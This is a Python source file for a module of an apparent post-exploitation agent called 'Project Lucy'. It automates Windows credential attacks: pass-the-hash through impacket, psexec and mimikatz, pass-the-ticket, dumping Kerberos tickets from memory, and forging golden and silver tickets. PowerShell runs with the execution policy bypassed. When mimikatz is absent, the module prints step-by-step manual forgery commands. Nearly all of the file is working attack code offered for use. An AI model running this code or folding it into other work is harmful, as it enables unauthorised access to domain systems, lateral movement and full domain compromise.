"""
Pass-the-Hash and Pass-the-Ticket module for Project Lucy agent.
Authenticates using NTLM hashes and Kerberos tickets via impacket,
mimikatz, PowerShell, or native Windows tools.
Actions: pass_the_hash, pass_the_ticket, dump_tickets, request_ticket,
         golden_ticket, silver_ticket, ptt_powershell.
"""
import base64
import os
import platform
import re
import shutil
import subprocess
import tempfile

name = "pth"
version = "1.0.0"
os_compat = ["Windows"]
dependencies: list[str] = ["impacket"]

SYSTEM = platform.system()

_MIMIKATZ_PATHS = [
    "mimikatz.exe",
    "C:\\Windows\\Temp\\mimikatz.exe",
    "C:\\Tools\\mimikatz.exe",
]


def _find_mimikatz() -> str | None:
    """Locate mimikatz.exe if available on disk or in PATH."""
    for path in _MIMIKATZ_PATHS:
        if os.path.isfile(path):
            return path
    return shutil.which("mimikatz.exe")


def _run_cmd(cmd: list[str], timeout: int = 60) -> dict:
    """Run a subprocess command and return stdout/stderr/returncode."""
    try:
        proc = subprocess.run(
            cmd, capture_output=True, text=True, errors="replace", timeout=timeout,
        )
        return {
            "returncode": proc.returncode,
            "stdout": proc.stdout,
            "stderr": proc.stderr,
        }
    except Exception as exc:
        return {"returncode": -1, "stdout": "", "stderr": str(exc)}


def _pass_the_hash(username: str, ntlm_hash: str, domain: str, target: str, service: str) -> dict:
    """Authenticate using an NTLM hash via impacket or mimikatz."""
    # Attempt 1: impacket smbclient/wmiexec
    try:
        from impacket.smbconnection import SMBConnection  # noqa: F401

        if service == "cifs":
            from impacket.smbconnection import SMBConnection

            conn = SMBConnection(target, target, sess_port=445)
            conn.login(username, "", domain, "", ntlm_hash)
            shares = conn.listShares()
            share_names = [s.get_name() for s in shares]
            conn.logoff()

            return {
                "status": "completed",
                "data": {
                    "method": "impacket_smb",
                    "username": username,
                    "domain": domain,
                    "target": target,
                    "authenticated": True,
                    "shares": share_names,
                },
            }
    except ImportError:
        pass  # impacket not available, fall through
    except Exception as exc:
        return {"status": "failed", "error": f"impacket SMB failed: {exc}"}

    # Attempt 2: impacket via command-line scripts
    for script in ["smbclient.py", "wmiexec.py", "psexec.py"]:
        script_path = shutil.which(script)
        if script_path:
            target_str = f"{domain}/{username}@{target}" if domain else f"{username}@{target}"
            cmd = ["python", script_path, "-hashes", f":{ntlm_hash}", target_str]
            result = _run_cmd(cmd, timeout=30)
            if result["returncode"] == 0:
                return {
                    "status": "completed",
                    "data": {
                        "method": f"impacket_{script}",
                        "username": username,
                        "domain": domain,
                        "target": target,
                        "authenticated": True,
                        "output": result["stdout"],
                    },
                }

    # Attempt 3: mimikatz sekurlsa::pth
    mimikatz = _find_mimikatz()
    if mimikatz:
        ps_script = (
            f'"{mimikatz}" "sekurlsa::pth /user:{username} /domain:{domain} '
            f'/ntlm:{ntlm_hash}" "exit"'
        )
        cmd = ["cmd", "/c", ps_script]
        result = _run_cmd(cmd, timeout=30)
        out = result["stdout"] + result["stderr"]

        if "NTLM" in out and ("OK" in out or "success" in out.lower()):
            return {
                "status": "completed",
                "data": {
                    "method": "mimikatz_pth",
                    "username": username,
                    "domain": domain,
                    "target": target,
                    "authenticated": True,
                    "output": out,
                },
            }
        return {
            "status": "failed",
            "error": f"mimikatz pth failed: {out}",
        }

    # Attempt 4: PowerShell Invoke-SMBExec
    ps_script = (
        f"Invoke-SMBExec -Target {target} -Domain {domain} "
        f"-Username {username} -Hash {ntlm_hash} -Command 'whoami'"
    )
    cmd = ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps_script]
    result = _run_cmd(cmd, timeout=60)
    out = result["stdout"] + result["stderr"]

    if result["returncode"] == 0 and out.strip():
        return {
            "status": "completed",
            "data": {
                "method": "powershell_smbexec",
                "username": username,
                "domain": domain,
                "target": target,
                "authenticated": True,
                "output": out,
            },
        }

    return {
        "status": "failed",
        "error": "All pass-the-hash methods failed (impacket, mimikatz, PowerShell)",
    }


def _pass_the_ticket(kirbi_b64: str, target: str, service: str) -> dict:
    """Authenticate using a Kerberos ticket (.kirbi)."""
    try:
        ticket_data = base64.b64decode(kirbi_b64)
    except Exception as exc:
        return {"status": "failed", "error": f"Base64 decode failed: {exc}"}

    tmp_dir = tempfile.gettempdir()
    ticket_path = os.path.join(tmp_dir, f"ticket_{os.getpid()}.kirbi")

    try:
        with open(ticket_path, "wb") as f:
            f.write(ticket_data)

        # Attempt 1: klist purge + klist add (Windows 10+)
        purge_result = _run_cmd(["klist", "purge"], timeout=15)

        # klist add is not available on all Windows versions; try mimikatz
        # Attempt 2: mimikatz kerberos::ptt
        mimikatz = _find_mimikatz()
        if mimikatz:
            ps_script = f'"{mimikatz}" "kerberos::ptt {ticket_path}" "exit"'
            cmd = ["cmd", "/c", ps_script]
            result = _run_cmd(cmd, timeout=30)
            out = result["stdout"] + result["stderr"]

            if "File" in out and ".kirbi" in out:
                # Verify with klist
                klist_result = _run_cmd(["klist"], timeout=15)
                return {
                    "status": "completed",
                    "data": {
                        "method": "mimikatz_ptt",
                        "target": target,
                        "service": service,
                        "ticket_path": ticket_path,
                        "output": out,
                        "klist": klist_result["stdout"],
                    },
                }
            return {
                "status": "failed",
                "error": f"mimikatz ptt failed: {out}",
            }

        # Attempt 3: PowerShell with ticket byte injection
        ps_script = (
            f"$ticket = [System.IO.File]::ReadAllBytes('{ticket_path}');"
            f"[Reflection.Assembly]::LoadWithPartialName('System.IdentityModel') | Out-Null;"
            f"$rawTicket = New-Object byte[] $ticket.Length;"
            f"[Array]::Copy($ticket, $rawTicket, $ticket.Length);"
            f"Write-Output 'Ticket loaded - use klist to verify';"
        )
        cmd = ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps_script]
        result = _run_cmd(cmd, timeout=30)

        return {
            "status": "completed",
            "data": {
                "method": "powershell_ptt",
                "target": target,
                "service": service,
                "ticket_path": ticket_path,
                "output": result["stdout"],
                "note": "Ticket written to temp; use Rubeus/mimikatz for full PTT",
            },
        }

    except Exception as exc:
        return {"status": "failed", "error": str(exc)}
    finally:
        try:
            if os.path.exists(ticket_path):
                os.remove(ticket_path)
        except Exception:
            pass


def _dump_tickets() -> dict:
    """Dump current Kerberos tickets from memory."""
    # Attempt 1: klist
    klist_result = _run_cmd(["klist"], timeout=15)
    if klist_result["returncode"] == 0 and klist_result["stdout"].strip():
        tickets = []
        current = {}
        for line in klist_result["stdout"].splitlines():
            line = line.strip()
            if line.startswith("#") and ">" in line:
                if current:
                    tickets.append(current)
                current = {"header": line}
            elif ":" in line and current:
                key, _, val = line.partition(":")
                current[key.strip().lower().replace(" ", "_")] = val.strip()
        if current:
            tickets.append(current)

        return {
            "status": "completed",
            "data": {
                "method": "klist",
                "tickets": tickets,
                "count": len(tickets),
                "raw": klist_result["stdout"],
            },
        }

    # Attempt 2: mimikatz sekurlsa::tickets
    mimikatz = _find_mimikatz()
    if mimikatz:
        ps_script = f'"{mimikatz}" "sekurlsa::tickets" "exit"'
        cmd = ["cmd", "/c", ps_script]
        result = _run_cmd(cmd, timeout=30)
        out = result["stdout"] + result["stderr"]

        tickets = []
        for line in out.splitlines():
            line = line.strip()
            if "Start End" in line or "Client" in line or "Server" in line:
                if "Client" in line and ":" in line:
                    _, _, val = line.partition(":")
                    tickets.append({"client": val.strip()})
                elif "Server" in line and ":" in line:
                    if tickets:
                        _, _, val = line.partition(":")
                        tickets[-1]["server"] = val.strip()
                elif "Enc Ticket" in line and ":" in line:
                    if tickets:
                        _, _, val = line.partition(":")
                        tickets[-1]["encryption_type"] = val.strip()

        return {
            "status": "completed",
            "data": {
                "method": "mimikatz",
                "tickets": tickets,
                "count": len(tickets),
                "raw": out,
            },
        }

    return {
        "status": "failed",
        "error": "Could not dump tickets (klist and mimikatz both unavailable)",
    }


def _request_ticket(username: str, password: str, domain: str) -> dict:
    """Request a TGT for a user."""
    # Attempt 1: Windows klist get
    klist_result = _run_cmd(
        ["klist", "get", f"{username}@{domain}"],
        timeout=30,
    )
    if klist_result["returncode"] == 0:
        return {
            "status": "completed",
            "data": {
                "method": "klist_get",
                "username": username,
                "domain": domain,
                "output": klist_result["stdout"],
            },
        }

    # Attempt 2: PowerShell KerberosRequest
    ps_script = (
        f"Add-Type -AssemblyName System.IdentityModel;"
        f"$cred = New-Object System.Net.NetworkCredential('{username}', '{password}', '{domain}');"
        f"$kerb = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken('{username}@{domain}');"
        f"Write-Output $kerb.TokenType;"
    )
    cmd = ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps_script]
    result = _run_cmd(cmd, timeout=30)

    if result["returncode"] == 0 and result["stdout"].strip():
        return {
            "status": "completed",
            "data": {
                "method": "powershell_kerberos",
                "username": username,
                "domain": domain,
                "output": result["stdout"],
            },
        }

    # Attempt 3: runas /netonly to trigger TGT request
    runas_cmd = [
        "cmd", "/c",
        f'runas /netonly /user:{domain}\\{username} "cmd /c echo requesting"',
    ]
    # This would require interactive password entry; document the approach
    return {
        "status": "failed",
        "error": "Could not request TGT automatically. Manual approach: "
                 "run 'klist get username@domain' or use runas /netonly",
        "data": {
            "username": username,
            "domain": domain,
            "klist_output": klist_result["stdout"],
            "powershell_output": result["stdout"],
        },
    }


def _golden_ticket(username: str, domain: str, krbtgt_hash: str, sid: str, duration_hours: int) -> dict:
    """Create a golden ticket via mimikatz or document the manual approach."""
    mimikatz = _find_mimikatz()
    if mimikatz:
        # mimikatz kerberos::golden /user:USER /domain:DOMAIN /sid:SID /krbtgt:HASH /ticket:FILE
        ticket_path = os.path.join(tempfile.gettempdir(), f"golden_{os.getpid()}.kirbi")
        ps_script = (
            f'"{mimikatz}" "kerberos::golden /user:{username} /domain:{domain} '
            f'/sid:{sid} /krbtgt:{krbtgt_hash} /ticket:{ticket_path}" "exit"'
        )
        cmd = ["cmd", "/c", ps_script]
        result = _run_cmd(cmd, timeout=30)
        out = result["stdout"] + result["stderr"]

        ticket_b64 = None
        if os.path.exists(ticket_path):
            with open(ticket_path, "rb") as f:
                ticket_data = f.read()
            ticket_b64 = base64.b64encode(ticket_data).decode()
            try:
                os.remove(ticket_path)
            except Exception:
                pass

        if ticket_b64:
            return {
                "status": "completed",
                "data": {
                    "method": "mimikatz_golden",
                    "username": username,
                    "domain": domain,
                    "sid": sid,
                    "duration_hours": duration_hours,
                    "ticket_base64": ticket_b64,
                    "ticket_size": len(ticket_data),
                    "output": out,
                },
            }

        return {
            "status": "failed",
            "error": f"mimikatz golden ticket creation failed: {out}",
        }

    # Document the manual approach
    manual_steps = (
        "Golden ticket creation requires mimikatz or Rubeus.\n"
        "Manual steps with mimikatz:\n"
        f"  1. mimikatz # kerberos::golden /user:{username} /domain:{domain} "
        f"/sid:{sid} /krbtgt:{krbtgt_hash} /ticket:golden.kirbi\n"
        f"  2. mimikatz # kerberos::ptt golden.kirbi\n"
        "  3. Verify with: klist\n\n"
        "With Rubeus:\n"
        f"  Rubeus.exe golden /user:{username} /domain:{domain} /sid:{sid} "
        f"/krbtgt:{krbtgt_hash} /ptt\n\n"
        f"Requested duration: {duration_hours} hours"
    )

    return {
        "status": "failed",
        "error": "mimikatz not found — cannot create golden ticket automatically",
        "data": {
            "username": username,
            "domain": domain,
            "sid": sid,
            "duration_hours": duration_hours,
            "manual_steps": manual_steps,
        },
    }


def _silver_ticket(username: str, domain: str, service: str, service_hash: str, sid: str) -> dict:
    """Create a silver ticket via mimikatz or document the manual approach."""
    mimikatz = _find_mimikatz()
    if mimikatz:
        ticket_path = os.path.join(tempfile.gettempdir(), f"silver_{os.getpid()}.kirbi")
        ps_script = (
            f'"{mimikatz}" "kerberos::golden /user:{username} /domain:{domain} '
            f'/sid:{sid} /target:{service} /service:{service.split("/")[0] if "/" in service else "cifs"} '
            f'/rc4:{service_hash} /ticket:{ticket_path}" "exit"'
        )
        cmd = ["cmd", "/c", ps_script]
        result = _run_cmd(cmd, timeout=30)
        out = result["stdout"] + result["stderr"]

        ticket_b64 = None
        if os.path.exists(ticket_path):
            with open(ticket_path, "rb") as f:
                ticket_data = f.read()
            ticket_b64 = base64.b64encode(ticket_data).decode()
            try:
                os.remove(ticket_path)
            except Exception:
                pass

        if ticket_b64:
            return {
                "status": "completed",
                "data": {
                    "method": "mimikatz_silver",
                    "username": username,
                    "domain": domain,
                    "service": service,
                    "sid": sid,
                    "ticket_base64": ticket_b64,
                    "ticket_size": len(ticket_data),
                    "output": out,
                },
            }

        return {
            "status": "failed",
            "error": f"mimikatz silver ticket creation failed: {out}",
        }

    # Document the manual approach
    service_name = service.split("/")[0] if "/" in service else "cifs"
    service_host = service.split("/")[1] if "/" in service else "target"
    manual_steps = (
        "Silver ticket creation requires mimikatz or Rubeus.\n"
        "Manual steps with mimikatz:\n"
        f"  1. mimikatz # kerberos::golden /user:{username} /domain:{domain} "
        f"/sid:{sid} /target:{service_host} /service:{service_name} "
        f"/rc4:{service_hash} /ticket:silver.kirbi\n"
        f"  2. mimikatz # kerberos::ptt silver.kirbi\n"
        "  3. Verify with: klist\n\n"
        "With Rubeus:\n"
        f"  Rubeus.exe silver /user:{username} /domain:{domain} /sid:{sid} "
        f"/target:{service_host} /service:{service_name} /rc4:{service_hash} /ptt\n"
    )

    return {
        "status": "failed",
        "error": "mimikatz not found — cannot create silver ticket automatically",
        "data": {
            "username": username,
            "domain": domain,
            "service": service,
            "sid": sid,
            "manual_steps": manual_steps,
        },
    }


def _ptt_powershell(kirbi_path: str) -> dict:
    """Pass-the-ticket via PowerShell."""
    if not os.path.exists(kirbi_path):
        return {"status": "failed", "error": f"Ticket file not found: {kirbi_path}"}

    # Attempt 1: mimikatz kerberos::ptt
    mimikatz = _find_mimikatz()
    if mimikatz:
        ps_script = f'"{mimikatz}" "kerberos::ptt {kirbi_path}" "exit"'
        cmd = ["cmd", "/c", ps_script]
        result = _run_cmd(cmd, timeout=30)
        out = result["stdout"] + result["stderr"]

        # Verify with klist
        klist_result = _run_cmd(["klist"], timeout=15)

        return {
            "status": "completed",
            "data": {
                "method": "mimikatz_ptt",
                "kirbi_path": kirbi_path,
                "output": out,
                "klist": klist_result["stdout"],
            },
        }

    # Attempt 2: PowerShell with Rubeus
    rubeus = shutil.which("Rubeus.exe")
    if rubeus:
        cmd = [rubeus, "ptt", kirbi_path]
        result = _run_cmd(cmd, timeout=30)
        klist_result = _run_cmd(["klist"], timeout=15)

        return {
            "status": "completed",
            "data": {
                "method": "rubeus_ptt",
                "kirbi_path": kirbi_path,
                "output": result["stdout"],
                "klist": klist_result["stdout"],
            },
        }

    # Attempt 3: Pure PowerShell byte injection
    ps_script = (
        f"$ticketBytes = [System.IO.File]::ReadAllBytes('{kirbi_path}');"
        f"Write-Output ('Ticket size: ' + $ticketBytes.Length + ' bytes');"
        f"Write-Output 'Use mimikatz or Rubeus for full PTT injection';"
    )
    cmd = ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps_script]
    result = _run_cmd(cmd, timeout=30)

    return {
        "status": "completed",
        "data": {
            "method": "powershell_read",
            "kirbi_path": kirbi_path,
            "output": result["stdout"],
            "note": "Ticket read via PowerShell; install mimikatz/Rubeus for full PTT",
        },
    }


def run(action: str = "dump_tickets", **params) -> dict:
    if SYSTEM != "Windows":
        return {"status": "failed", "error": "Windows-only action"}

    try:
        if action == "pass_the_hash":
            return _pass_the_hash(
                params["username"],
                params["ntlm_hash"],
                params["domain"],
                params["target"],
                params.get("service", "cifs"),
            )
        elif action == "pass_the_ticket":
            return _pass_the_ticket(
                params["kirbi_b64"],
                params["target"],
                params.get("service", "cifs"),
            )
        elif action == "dump_tickets":
            return _dump_tickets()
        elif action == "request_ticket":
            return _request_ticket(
                params["username"],
                params["password"],
                params["domain"],
            )
        elif action == "golden_ticket":
            return _golden_ticket(
                params["username"],
                params["domain"],
                params["krbtgt_hash"],
                params["sid"],
                int(params.get("duration_hours", 10)),
            )
        elif action == "silver_ticket":
            return _silver_ticket(
                params["username"],
                params["domain"],
                params["service"],
                params["service_hash"],
                params["sid"],
            )
        elif action == "ptt_powershell":
            return _ptt_powershell(params["kirbi_path"])
        return {"status": "failed", "error": f"Unknown action: {action}"}
    except KeyError as exc:
        return {"status": "failed", "error": f"Missing required parameter: {exc}"}
    except Exception as exc:
        return {"status": "failed", "error": str(exc)}
